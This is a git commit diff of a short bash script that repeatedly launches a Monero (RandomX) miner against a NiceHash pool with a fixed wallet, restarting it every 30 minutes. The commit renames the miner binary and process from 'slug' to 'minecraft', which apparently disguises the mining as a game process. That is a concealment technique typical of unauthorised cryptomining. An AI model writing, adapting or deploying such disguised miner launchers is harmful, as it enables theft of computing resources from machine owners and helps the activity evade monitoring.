fa4ec4076588c3e08f12a7dccd0a8a2fb3debd53
SnowR4in <92912334+SnowR4in@users.noreply.github.com>
2024-07-16 12:35:15 +0600

    Update b.sh

--- b.sh
+++ b.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
 while true; do
-    ./slug -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -a rx -k -u NHbLt4t5HiuQaT4qrLCBnoEUeKH1aG44eGdG.slug -p x &
-    slug_pid=$!
+    ./minecraft -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -a rx -k -u NHbLt4t5HiuQaT4qrLCBnoEUeKH1aG44eGdG.slug -p x &
+    minecraft_pid=$!
     sleep 1800
-    kill $slug_pid
-    wait $slug_pid 2>/dev/null
+    kill $minecraft_pid
+    wait $minecraft_pid 2>/dev/null
 done
